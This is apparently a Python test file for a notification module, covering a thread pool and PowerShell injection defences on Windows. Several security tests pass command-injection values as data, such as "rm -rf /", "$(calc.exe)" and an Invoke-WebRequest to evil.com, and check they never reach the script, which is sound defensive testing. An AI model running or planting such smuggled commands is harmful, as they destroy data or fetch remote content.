"""
tests/test_notifications.py - Tests for notification thread pool.
"""

import base64
from unittest.mock import MagicMock, patch

# ===========================================================================
# Notification pool
# ===========================================================================

class TestNotificationPool:
    """Fix #3: ThreadPoolExecutor replaces unbounded threads."""

    def test_pool_exists_with_correct_config(self):
        from concurrent.futures import ThreadPoolExecutor

        from engine import notifications
        assert isinstance(notifications._notification_pool, ThreadPoolExecutor)
        assert notifications._notification_pool._max_workers == 4

    def test_module_level_random(self):
        """Fix #8: random is imported at module level."""
        import engine.notifications as notif
        assert hasattr(notif, "random")
        assert notif.random is __import__("random")

    def test_cli_commands_module_level_random(self):
        """Fix #8: random is imported at module level in cli/commands.py."""
        from cli import commands
        assert hasattr(commands, "random")
        assert commands.random is __import__("random")

    def test_notify_async_uses_pool(self):
        """notify_async submits to pool instead of creating Thread."""
        from engine import notifications
        with patch.object(notifications._notification_pool, "submit") as mock_submit:
            notifications.notify_async("title", "msg", word="Test", level=1)
            mock_submit.assert_called_once_with(
                notifications._send_native_notification, "title", "msg", "Test", 1
            )

    def test_webhook_async_uses_pool(self):
        """_send_webhook_async submits to pool instead of creating Thread."""
        from engine import notifications
        with patch.object(notifications._notification_pool, "submit") as mock_submit:
            notifications._send_webhook_async("catch", word="X", level=5)
            mock_submit.assert_called_once_with(
                notifications._send_webhook, "catch", word="X", level=5
            )


# ===========================================================================
# Windows notification security
# ===========================================================================

class TestWindowsNotificationSecurity:
    """PowerShell injection prevention via EncodedCommand + env vars."""

    def test_uses_encoded_command_not_raw_string(self, monkeypatch):
        """PS script must be base64-encoded, never interpolated with user input."""
        from engine import notifications

        monkeypatch.setattr("platform.system", lambda: "Windows")
        mock_run = MagicMock()
        monkeypatch.setattr("subprocess.run", mock_run)

        notifications._send_native_notification("Test Title", "Hello world", word="Thinking", level=1)

        mock_run.assert_called_once()
        args = mock_run.call_args[0][0]
        assert args[0] == "powershell"
        assert "-EncodedCommand" in args
        # No -Command flag (which would take raw PS)
        assert "-Command" not in args

    def test_title_and_message_passed_via_env_not_inline(self, monkeypatch):
        """User-controlled strings must go through env vars, not PS code."""
        from engine import notifications

        monkeypatch.setattr("platform.system", lambda: "Windows")
        mock_run = MagicMock()
        monkeypatch.setattr("subprocess.run", mock_run)

        notifications._send_native_notification("Evil'; rm -rf /; '", "$(calc.exe)", word="Test", level=1)

        mock_run.assert_called_once()
        env = mock_run.call_args[1]["env"]
        assert env["_CMON_TITLE"] == "Claudemon \u2014 Evil'; rm -rf /; '"
        assert env["_CMON_MSG"] == "$(calc.exe)"

        # Decode the PS script and verify no user strings are embedded
        encoded = mock_run.call_args[0][0][mock_run.call_args[0][0].index("-EncodedCommand") + 1]
        ps_script = base64.b64decode(encoded).decode("utf-16-le")
        assert "Evil" not in ps_script
        assert "calc" not in ps_script
        assert "$env:_CMON_TITLE" in ps_script
        assert "$env:_CMON_MSG" in ps_script

    def test_injection_payload_in_word_is_harmless(self, monkeypatch):
        """A crafted word with PS metacharacters cannot escape into the script."""
        from engine import notifications

        monkeypatch.setattr("platform.system", lambda: "Windows")
        mock_run = MagicMock()
        monkeypatch.setattr("subprocess.run", mock_run)

        malicious_word = "Test$(Invoke-WebRequest http://evil.com)"
        notifications._send_native_notification("title", f"Caught {malicious_word}!", word=malicious_word, level=1)

        mock_run.assert_called_once()
        encoded = mock_run.call_args[0][0][mock_run.call_args[0][0].index("-EncodedCommand") + 1]
        ps_script = base64.b64decode(encoded).decode("utf-16-le")
        assert "Invoke-WebRequest" not in ps_script
        assert "evil.com" not in ps_script
